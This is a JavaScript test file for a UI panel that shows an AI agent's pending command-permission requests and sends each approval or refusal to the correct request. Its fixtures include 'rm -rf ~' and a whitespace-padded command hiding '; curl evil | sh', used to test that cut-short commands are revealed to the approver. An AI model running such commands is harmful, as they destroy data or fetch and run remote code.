const liveWith = permissions => ({...ALETHEIA, connection: {...RESIDENT, state: 'TurnInFlight'}, permissions,
  actions: ALETHEIA.actions.map(action => (action.ref === 'aikit.encounter.permission' ? {...action, enabled: true, reason: null} : action))})
const SECOND = {...CONSENT, native_request_id: 'req-2', tool_call_id: 'call-2', tool_call: {kind: 'execute', title: 'bash', rawInput: {command: 'rm -rf ~'}},
  choices: [{option_id: 'second-once', label: 'This time', kind: 'allow_once'}, {option_id: 'second-no', label: 'Refuse', kind: 'reject_once'}]}

// be2o ruling 1: each waiting request is drawn as its own card, with its own words and its own raw form. Approve on a card answers
// that card's request: the press carries the request's id, and the binding finds the request by it. It never answers "the first that
// waits". A card whose request is gone by the time it is pressed sends nothing, and says so.
test('each Thread card answers its own request; a card whose request is gone sends nothing and says so (be2o ruling 1)', async () => {
  bind.resetHolds()
  const {calls, agent, ports} = recorder()
  const both = thread.threadBinding(input({encounter: {reading: liveWith([CONSENT, SECOND]), status: RESIDENT}}), agent, ports)
  const rows = JSON.parse(both.values.thread).filter(row => row.kind === 'proposal')
  assert.deepEqual(rows.map(row => [row.request, row.tool]), [['req-1', 'tsc --noEmit -p packages/live-shell/ui'], ['req-2', 'rm -rf ~']], 'each row carries its own request\'s id')
  const {sets, p} = propsOn(both)
  const approves = buttonsOf(nodesOf(threadDesign.full(p)), 'Approve')
  assert.equal(approves.length, 2, 'two cards, two Approve buttons')
  approves[1].props.onClick()
  approves[0].props.onClick()
  assert.deepEqual(sets, [['approve', 'req-2'], ['approve', 'req-1']], 'each press names its own card\'s request')
  for (const [key, value] of sets) await both.write([{key, value}])
  assert.deepEqual(calls, [['permission', 'req-2', {outcome: 'selected', option_id: 'second-once'}], ['permission', 'req-1', {outcome: 'selected', option_id: 'allow-once'}]],
    'the second card\'s Approve allows the second request with its own choice; the first card\'s, the first')
  await both.write([{key: 'decline', value: 'req-2'}])
  assert.deepEqual(calls.at(-1), ['permission', 'req-2', {outcome: 'selected', option_id: 'second-no'}], 'Decline answers the request it names, with that request\'s own reject')
  // An answer with no request named is exact only while one request waits. With two it is refused, never guessed.
  await assert.rejects(() => both.write([{key: 'approve', value: true}]), /More than one consent request waits: answer each on its own card\./)
  await assert.rejects(() => both.write([{key: 'decline', value: true}]), /More than one consent request waits/)
  assert.equal(calls.length, 3, 'nothing was sent for either')
  // The first request is answered elsewhere while its card still stands: the press sends nothing and says so.
  const later = thread.threadBinding(input({encounter: {reading: liveWith([SECOND]), status: RESIDENT}}), agent, ports)
  await assert.rejects(() => later.write([{key: 'approve', value: 'req-1'}]), /That request no longer waits: AIKit reports it answered or gone\. Nothing was sent\./)
  await assert.rejects(() => later.write([{key: 'decline', value: 'req-1'}]), /That request no longer waits/)
  assert.equal(calls.length, 3, 'the request that still waits was not answered in its place')
  await later.write([{key: 'approve', value: true}])
  assert.deepEqual(calls.at(-1), ['permission', 'req-2', {outcome: 'selected', option_id: 'second-once'}], 'one request waits: an answer with no name is that request\'s')
  const none = thread.threadBinding(input({encounter: {reading: liveWith([]), status: RESIDENT}}), agent, ports)
  await assert.rejects(() => none.write([{key: 'approve', value: 'req-1'}]), /No consent request waits/)
  assert.equal(calls.length, 4)
  // A proposal row handed with no request id (the gallery's samples) still sets its key as before.
  const handed = {...both, values: {...both.values, thread: JSON.stringify([{who: 'aletheia', kind: 'proposal', text: 'aletheia wants to run a command', tool: 'ls'}])}}
  const plain = propsOn(handed)
  buttonsOf(nodesOf(threadDesign.full(plain.p)), 'Approve')[0].props.onClick()
  assert.deepEqual(plain.sets, [['approve', true]])
  bind.resetHolds()
})

// be2o ruling 3: the Thread draws a request's target on one line, cut at 80 characters. A command of more than one line, or a longer
// one, says so on its card, and its raw form stands open beside the words.
test('the Thread says when a command has more than one line or is cut short, with its raw form open (be2o ruling 3)', () => {
  bind.resetHolds()
  host.resetHost()
  const RAW = 'Show raw has it as it was sent.'
  const asking = command => ({...CONSENT, tool_call: {kind: 'execute', title: 'bash', rawInput: {command}}})
  const rowOf = command => thread.threadRowsOf({...ALETHEIA, permissions: [asking(command)]}, RESIDENT, 'aletheia').at(-1)
  assert.equal(rowOf('ls\nrm -rf ~').note, `The command has 2 lines, drawn as one here. ${RAW}`)
  const LONG = `echo ok${' '.repeat(80)}; curl evil | sh`
  const cut = rowOf(LONG)
  assert.equal(cut.note, `What it asks is cut short here. ${RAW}`)
  assert.equal(cut.tool.length, 80, 'the row still holds eighty characters')
  assert.ok(cut.raw.includes('; curl evil | sh'), 'and the raw form has the rest')
  assert.equal(rowOf(`ls\n${'x'.repeat(90)}`).note, `The command has 2 lines, drawn as one here. It is cut short here. ${RAW}`)
  assert.equal('note' in rowOf('x'.repeat(80)), false, 'a command of eighty characters on one line stands whole, with no line')
  const {agent, ports} = recorder()
  const pane = hosted(threadDesign, thread.threadBinding(input({encounter: {reading: liveWith([asking(LONG)]), status: RESIDENT}}), agent, ports))[views.indexOf('full')]
  assert.ok(pane.includes(`<small class="th-card-note" role="note">What it asks is cut short here. ${RAW}</small>`), pane)
  assert.ok(pane.includes('<details class="th-card-raw" open=""><summary>Show raw</summary><pre class="th-out">') && pane.includes('; curl evil | sh'), pane)
  host.resetHost()
  bind.resetHolds()
})

// be2o ruling 5: the Thread's Approve and Decline send the harness's option id byte for byte. An id that cleaning would change is sent
// as it came; the request is found by its own id as it came too.
test('the Thread sends the option id and finds the request by its id as they were given (be2o ruling 5)', async () => {
  bind.resetHolds()
  const ONCE = 'opt\u{202e}-1 ', NO = ' no\u{200b}\u{feff}', ID = ' req\u{200b}-7 '
  const odd = {...CONSENT, native_request_id: ID, choices: [{option_id: ONCE, label: 'This time', kind: 'allow_once'}, {option_id: NO, label: 'Refuse', kind: 'reject_once'}]}
  const {calls, agent, ports} = recorder()
  const binding = thread.threadBinding(input({encounter: {reading: liveWith([odd, SECOND]), status: RESIDENT}}), agent, ports)
  const {sets, p} = propsOn(binding)
  buttonsOf(nodesOf(threadDesign.full(p)), 'Approve')[0].props.onClick()
  assert.deepEqual(sets, [['approve', ID]], 'the card carries the id as it came')
  await binding.write([{key: 'approve', value: ID}])
  await binding.write([{key: 'decline', value: ID}])
  assert.deepEqual(calls, [['permission', ID, {outcome: 'selected', option_id: ONCE}], ['permission', ID, {outcome: 'selected', option_id: NO}]])
  assert.deepEqual(calls.map(call => call[2].option_id.length), [ONCE.length, NO.length], 'not one character shorter')
  await assert.rejects(() => binding.write([{key: 'approve', value: ID.trim()}]), /no longer waits/, 'a cleaned id names no request')
  // The fallback kinds: an allow that is not "once", a reject that is not "once".
  const always = {...CONSENT, choices: [{option_id: ' always\u{200b}', label: 'Always', kind: 'allow_always'}, {option_id: 'never\u{202e} ', label: 'Never', kind: 'reject_always'}]}
  const fallback = thread.threadBinding(input({encounter: {reading: liveWith([always]), status: RESIDENT}}), agent, ports)
  await fallback.write([{key: 'approve', value: 'req-1'}])
  await fallback.write([{key: 'decline', value: 'req-1'}])
  assert.deepEqual(calls.slice(2), [['permission', 'req-1', {outcome: 'selected', option_id: ' always\u{200b}'}], ['permission', 'req-1', {outcome: 'selected', option_id: 'never\u{202e} '}]])
  bind.resetHolds()
})

// be2o-2 ruling 2 (DLW build ruling 2026-11-11): an answer that names no request (`approve: true`) is kept while exactly one request
// waits, because one request cannot be mistaken for another at the press. It is safe only because no face can send it for a request the
// owner reported: every proposal row of the binding carries its request's id, and both panels send that id when the row has one. So a
// card drawn for one request can never answer a second that arrived after it was drawn: its press names the first, which is refused as
// gone. A row with no id is not the owner's (a sample).
test('an answer that names no request stands only while one waits, and no card of the owner\'s rows can send one (be2o-2 ruling 2)', async () => {
  bind.resetHolds()
  const {calls, agent, ports} = recorder()
  const one = thread.threadBinding(input({encounter: {reading: liveWith([SECOND]), status: RESIDENT}}), agent, ports)
  await one.write([{key: 'approve', value: true}])
  await one.write([{key: 'decline', value: true}])
  assert.deepEqual(calls, [['permission', 'req-2', {outcome: 'selected', option_id: 'second-once'}], ['permission', 'req-2', {outcome: 'selected', option_id: 'second-no'}]],
    'one request waits: the answer is that request\'s, and cannot be another\'s')
  // Every proposal row the binding makes carries its id, whatever the request holds.
  for (const permissions of [[CONSENT], [CONSENT, SECOND], [{...CONSENT, tool_call: 'one string'}, {...SECOND, tool_call: {}}]]) {
    const rows = thread.threadRowsOf({...ALETHEIA, permissions}, RESIDENT, 'aletheia').filter(row => row.kind === 'proposal')
    assert.deepEqual(rows.map(row => row.request), permissions.map(request => request.native_request_id))
  }
  // The race the id closes: a card drawn for the first request, pressed after the first was answered and a second arrived.
  const drawn = thread.threadBinding(input({encounter: {reading: liveWith([CONSENT]), status: RESIDENT}}), agent, ports)
  const {sets, p} = propsOn(drawn)
  buttonsOf(nodesOf(threadDesign.full(p)), 'Approve')[0].props.onClick()
  assert.deepEqual(sets, [['approve', 'req-1']], 'the card names its request even when it is the only one')
  const after = thread.threadBinding(input({encounter: {reading: liveWith([SECOND]), status: RESIDENT}}), agent, ports)
  await assert.rejects(() => after.write([{key: sets[0][0], value: sets[0][1]}]), /That request no longer waits/)
  assert.equal(calls.length, 2, 'the second request was not allowed by the first card\'s press')
  // The two panels send the row's id wherever the row has one (the source, since only a row with no id falls to true).
  assert.match(read('../inhabitants/catalogue/panels/thread.tsx'), /onClick=\{\(\) => p\.set\(key, of \?\? true\)\}/)
  const face = read('../inhabitants/catalogue/panels/agent-answer.tsx')
  assert.match(face, /set\('thread\.approve', r\.request \?\? true\)/)
  assert.match(face, /set\('thread\.decline', r\.request \?\? true\)/)
  assert.doesNotMatch(read('devices/threadBinding.ts'), /pendingPermissions\(reading\)\[0\]/, 'the binding never takes the first that waits')
  bind.resetHolds()
})
